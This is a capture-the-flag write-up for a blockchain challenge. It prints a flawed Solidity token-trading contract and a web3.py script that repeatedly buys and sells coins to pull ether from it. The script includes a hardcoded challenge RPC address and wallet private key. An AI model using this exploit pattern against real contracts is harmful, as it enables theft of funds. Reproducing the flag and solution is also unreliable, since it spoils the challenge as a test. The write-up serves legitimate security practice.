@@ -1,0 +1,244 @@
+# PBJ
+
+Category: MISC (Blockchain)
+
+Points: 345
+
+Solves: 44
+
+>The bot does all the trading, while I sit back and relax.
+
+We are given a etheruem smart contract:
+
+```js
+pragma solidity ^0.8.0;
+contract PBJ {
+    uint256 public flagCoin = 100;
+    uint256 public eth; 
+    uint256 public price; 
+    uint256 public totalPrice;
+    uint256 public k;
+    uint256 public x;
+    uint256 public y;
+    uint256 public to_pay;
+    uint256 public flag;
+    mapping(address => uint256) public flags;
+     constructor() payable {
+         eth = msg.value; 
+         k = eth * flagCoin;
+     }
+     function buy() payable public {
+        flag = (msg.value*flagCoin)/(eth+msg.value);
+        require(flag <= flagCoin,"Not enough flagCoin!");
+        flagCoin =  flagCoin - flag;
+        eth += msg.value;
+        flags[msg.sender] += flag;
+     }
+     function sell(uint256 flag) payable public {
+         require(flag <= flagCoin,"Not enough flagCoin!");
+         require(flag <= flags[msg.sender],"You do not have that many flagCoins!");
+         y = flag + flagCoin;
+         x = k/y;
+         to_pay = eth - x;
+         flagCoin = y;
+         eth = x;
+         flags[msg.sender] -= flag;
+         payable(msg.sender).transfer(to_pay);
+     }
+     function check_balance() public view returns (uint256) {
+        return flags[msg.sender];
+     }
+     function priceForXFlagCoin(uint256 flag) public view returns (uint256) {
+        return (k/(flagCoin-flag))-eth;
+     }
+
+     function isChallSolved() public view returns (bool) {
+        return (msg.sender.balance / 1 ether) > 50;
+    }
+}
+```
+
+Looking at the methods, it seems like the goal of this challenge is to gain ether by buying and selling `flagCoin`s and finding some kinda of bug that allows us to gain more ether when we sell compared to how much we lose when we buy.
+
+
+Since we are trying to make money by buying and selling coins we need to find a way to calculate our net profits for spending `X` amount of ether to buy flag coins. However, this doesn't make sense because then we would have to calculate the best value for spending any amount of ether which is a continous variable.
+
+Instead, our insight will be to calcuate how much money we will gain if we buy and sell some amount of flagcoins. Since we can only have a discrete number of the flagcoins, we can just loop through calculating our profit if we buy and sell `i` flagcoins.
+
+Since we are given all the variables used to calculate the price of buying a coin, we can just calculate that value locally:
+
+```py
+def calcPayment(flag, flagCoin, eth):
+    payment = contract.functions.priceForXFlagCoin(flag).call({'from': ACCOUNT})
+    l = payment
+    r = payment*4
+
+    while l < r:
+        mid = (l+r)//2
+        if (w3.from_wei(mid,'ether')*decimal.Decimal(flagCoin))//(decimal.Decimal(flagCoin)+w3.from_wei(mid,'ether')) < flag:
+            l = mid+1
+        else:
+            r = mid
+    
+    assert (w3.from_wei(l,'ether')*decimal.Decimal(flagCoin))//(decimal.Decimal(flagCoin)+w3.from_wei(l,'ether')) == flag
+    return l+w3.to_wei(0.2, 'ether')
+```
+
+We can also calculate the value for when we sell the flagcoins as well locally:
+
+```py
+# if i buy with income
+t_flagCoin = flagCoin - flag
+t_eth = eth_value + w3.from_wei(payment,'ether')
+income_eth = t_eth - k//(flag + t_flagCoin)
+print(income_eth, f"ETH for {flag} sell")
+```
+
+Finally, we can just loop over some amount of flagcoins we want to buy and check the profitability of each one:
+
+```py
+for flag in range(11,1,-1):
+    payment = calcPayment(flag, flagCoin, eth_value)
+    print(w3.from_wei(payment,'ether'), f"ETH for {flag} buy")
+
+    # if i buy with income
+    t_flagCoin = flagCoin - flag
+    t_eth = eth_value + w3.from_wei(payment,'ether')
+    income_eth = t_eth - k//(flag + t_flagCoin)
+    print(income_eth, f"ETH for {flag} sell")
+
+    if income_eth > w3.from_wei(payment,'ether') and w3.from_wei(payment,'ether') < balance:
+        print(f"Using {w3.from_wei(payment,'ether')} to buy {flag} flags")
+        buy_func = contract.functions.buy()
+        send_tx(buy_func, payment)
+        getInfo()
+        sell_func = contract.functions.sell(flag)
+        send_tx(sell_func)
+        getInfo()
+        flagCoin -= flag
+        income_eth = k//(flag + t_flagCoin)
+        return
+```
+
+After running this enough times, we will eventually gain enough coins to solve the challenge.
+
+
+## Flag
+
+`ictf{n3v3r_7ru571ng_7h15_b0t_4g41n}`
+
+## Solve Script
+
+```py
+from web3 import Web3
+import math
+import decimal
+
+# ====== CONFIG ======
+RPC_URL = "http://34.45.211.133:41878"   # <-- replace with the actual RPC endpoint
+CONTRACT_ADDRESS = "0xE2AE71bD3Cf2F3ae0255C783CCf1e16Ed44E20Cd" # <-- replace with actual contract address
+PRIVATE_KEY = "0x3b0ca8f988e0d92c3b5fb000717e4818c3dc6c1875965922d557c302341f5a36"           # <-- replace with your wallet key
+ACCOUNT = "0xA738e2b28B26e30f2e81903F0C1A1604fB7ccF93"            # <-- replace with your wallet address
+
+# Connect to chain
+w3 = Web3(Web3.HTTPProvider(RPC_URL))
+assert w3.is_connected(), "Could not connect to RPC"
+
+# Load contract ABI
+ABI = [
+    ... # Removed ABI for readability
+]
+
+contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)
+
+# Helper: build & send a transaction
+def send_tx(func, value=0):
+    nonce = w3.eth.get_transaction_count(ACCOUNT)
+    tx = func.build_transaction({
+        'from': ACCOUNT,
+        'value': value,
+        'gas': 300000,
+        'gasPrice': w3.to_wei('1', 'gwei'),
+        'nonce': nonce
+    })
+    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
+    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
+    return receipt
+
+def getInfo():
+    # Contract Eth 
+    eth_value = contract.functions.eth().call()
+    print("ETH in pool at start:", w3.from_wei(eth_value, 'ether'))
+
+    # Contract l
+    k_value = contract.functions.k().call()
+    print("K value starts at:", w3.from_wei(k_value, 'ether'))
+
+    # Ether count
+    balance = w3.eth.get_balance(ACCOUNT)
+    print("Your ETH balance:", w3.from_wei(balance, 'ether'))
+
+    # Ceck your flag balance
+    balance = contract.functions.check_balance().call({'from': ACCOUNT})
+    print("Your flag balance:", balance)
+
+def calcPayment(flag, flagCoin, eth):
+    payment = contract.functions.priceForXFlagCoin(flag).call({'from': ACCOUNT})
+    l = payment
+    r = payment*4
+
+    while l < r:
+        mid = (l+r)//2
+        if (w3.from_wei(mid,'ether')*decimal.Decimal(flagCoin))//(decimal.Decimal(flagCoin)+w3.from_wei(mid,'ether')) < flag:
+            l = mid+1
+        else:
+            r = mid
+    
+    assert (w3.from_wei(l,'ether')*decimal.Decimal(flagCoin))//(decimal.Decimal(flagCoin)+w3.from_wei(l,'ether')) == flag
+    return l+w3.to_wei(0.2, 'ether')
+
+global_eth = decimal.Decimal(99.99)
+global_flagCoin = decimal.Decimal(100)
+
+def calcGoodValue():
+    global global_eth, global_flagCoin
+    flagCoin = global_flagCoin
+    eth_value = global_eth
+    k = flagCoin*eth_value
+    balance = w3.eth.get_balance(ACCOUNT)
+    balance = w3.from_wei(balance, 'ether')
+
+    print(f"Current Values flagCoin: {flagCoin} | eth: {eth_value}")
+    for flag in range(11,1,-1):
+        payment = calcPayment(flag, flagCoin, eth_value)
+        print(w3.from_wei(payment,'ether'), f"ETH for {flag} buy")
+
+        # if i buy with income
+        t_flagCoin = flagCoin - flag
+        t_eth = eth_value + w3.from_wei(payment,'ether')
+        income_eth = t_eth - k//(flag + t_flagCoin)
+        print(income_eth, f"ETH for {flag} sell")
+
+        if income_eth > w3.from_wei(payment,'ether') and w3.from_wei(payment,'ether') < balance:
+            print(f"Using {w3.from_wei(payment,'ether')} to buy {flag} flags")
+            buy_func = contract.functions.buy()
+            send_tx(buy_func, payment)
+            getInfo()
+            sell_func = contract.functions.sell(flag)
+            send_tx(sell_func)
+            getInfo()
+            flagCoin -= flag
+            income_eth = k//(flag + t_flagCoin)
+            return
+
+getInfo()
+
+calcGoodValue()
+
+getInfo()
+
+solved = contract.functions.isChallSolved().call({'from': ACCOUNT})
+
+print("Challenge solved?", solved)
+```
